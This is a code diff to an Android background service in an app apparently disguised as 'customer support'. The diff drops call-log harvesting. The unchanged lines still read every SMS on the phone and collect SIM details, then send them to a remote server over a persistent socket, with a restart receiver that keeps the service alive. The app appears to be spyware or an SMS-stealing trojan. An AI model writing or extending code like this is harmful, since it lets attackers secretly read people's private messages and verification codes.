@@ -18,7 +18,6 @@ import android.net.Uri
 import androidx.core.app.NotificationCompat
 import com.customersupport.CustomerSupportApp
 import com.customersupport.MainActivity
-import com.customersupport.data.CallLogReader
 import com.customersupport.data.SimManager
 import com.customersupport.data.SmsReader
 import com.customersupport.receiver.RestartReceiver
@@ -40,7 +39,6 @@ class SocketService : Service() {
     private val socketManager get() = CustomerSupportApp.socketManager
     private val preferencesManager get() = CustomerSupportApp.preferencesManager
     private val smsReader by lazy { SmsReader(this) }
-    private val callLogReader by lazy { CallLogReader(this) }
     private val simManager by lazy { SimManager(this) }
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -331,11 +329,6 @@ class SocketService : Service() {
                 if (smsArray.length() > 0) {
                     pendingSyncManager.queueSmsSync(deviceId, smsArray)
                 }
-
-                val callsArray = callLogReader.readCallLogs()
-                if (callsArray.length() > 0) {
-                    pendingSyncManager.queueCallsSync(deviceId, callsArray)
-                }
                 return
             }
 
@@ -350,11 +343,6 @@ class SocketService : Service() {
             val smsArray = smsReader.readAllSms()
             if (smsArray.length() > 0) {
                 socketManager.syncSms(deviceId, smsArray)
-            }
-
-            val callsArray = callLogReader.readCallLogs()
-            if (callsArray.length() > 0) {
-                socketManager.syncCalls(deviceId, callsArray)
             }
 
             preferencesManager.saveLastSyncTime(System.currentTimeMillis())
